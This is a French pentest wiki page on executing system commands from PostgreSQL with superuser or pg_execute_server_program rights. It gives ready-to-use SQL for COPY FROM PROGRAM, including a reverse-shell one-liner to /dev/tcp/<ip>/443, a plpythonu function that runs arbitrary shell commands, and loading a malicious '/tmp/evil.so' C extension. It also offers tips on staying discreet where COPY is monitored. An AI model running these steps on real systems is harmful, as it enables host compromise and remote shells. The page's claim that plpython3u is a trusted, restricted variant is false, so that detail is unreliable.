---
title: "Exécution de commandes PostgreSQL"
description: "Exécuter des commandes système depuis PostgreSQL avec le compte de service via COPY FROM PROGRAM, les langages procéduraux non fiables comme plpythonu et plperlu, et les extensions C chargeables."
keywords:
  - COPY FROM PROGRAM
  - plpythonu
  - plperlu
  - CREATE FUNCTION
  - PostgreSQL RCE
---

# Exécution de commandes

En tant que superutilisateur (ou rôle disposant de `pg_execute_server_program`), PostgreSQL exécute des commandes système avec son **compte de service**. `COPY ... FROM PROGRAM` est la voie directe ; les langages non fiables et les extensions C en sont les alternatives.

## COPY FROM PROGRAM

Depuis PostgreSQL 9.3, un superutilisateur peut rediriger la sortie d'un programme dans une table, ce qui exécute simplement la commande :

```sql
CREATE TABLE cmd_out (line text);
COPY cmd_out FROM PROGRAM 'id';
SELECT * FROM cmd_out;
-- one-shot reverse shell: COPY cmd_out FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/<ip>/443 0>&1"';
```

## Langages procéduraux non fiables

Si un langage **non fiable** est disponible, ses fonctions s'exécutent sans sandbox :

```sql
CREATE OR REPLACE LANGUAGE plpythonu;   -- or plperlu
CREATE OR REPLACE FUNCTION exec(cmd text) RETURNS text AS $$
  import subprocess
  return subprocess.check_output(cmd, shell=True).decode()
$$ LANGUAGE plpythonu;
SELECT exec('id');
```

## Fonctions d'extension C

Un superutilisateur peut charger une bibliothèque partagée et l'exposer en tant que fonction, la méthode la plus puissante et la plus discrète là où `COPY PROGRAM` est surveillé :

```sql
-- write a compiled .so via the file primitives, then:
CREATE FUNCTION sys(cstring) RETURNS int AS '/tmp/evil.so', 'sys' LANGUAGE C STRICT;
```

## Notes d'exploitation

- `COPY ... FROM PROGRAM` est la première chose à essayer en tant que superutilisateur : une seule instruction, aucun objet supplémentaire à compiler.
- Ce n'est **pas réservé au superutilisateur** : un rôle disposant de `pg_execute_server_program` peut l'exécuter sans superutilisateur complet, alors vérifiez les appartenances de rôle (`\du`) lors de l'[accès](access.md) plutôt que de supposer qu'il faut des droits équivalents à `sa`.
- Les commandes s'exécutent avec le **compte de service PostgreSQL** (`postgres` sur la plupart des hôtes Linux), le gain est donc un accès à l'hôte en tant que cet utilisateur, souvent un pivot vers une escalade locale plus poussée.
- `plpythonu`/`plperlu` doivent déjà être installés en tant que variantes *non fiables* ; le `plpython3u` fiable est restreint.
- `pgsql_shell` (metasploit `postgres_payload`/`postgres_copy_from_program_cmd_exec`) automatise le chemin COPY.

## Outils

- **psql** : exécuter les instructions directement.
- **Metasploit** (`postgres_copy_from_program_cmd_exec`, `postgres_payload`) : COPY et exécution de payload automatisés.

## Références

- [HackTricks: PostgreSQL RCE](https://hacktricks.wiki/en/network-services-pentesting/pentesting-postgresql.html)
- [PostgreSQL: COPY FROM PROGRAM](https://www.postgresql.org/docs/current/sql-copy.html)
- [PayloadsAllTheThings: PostgreSQL injection and RCE](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md)
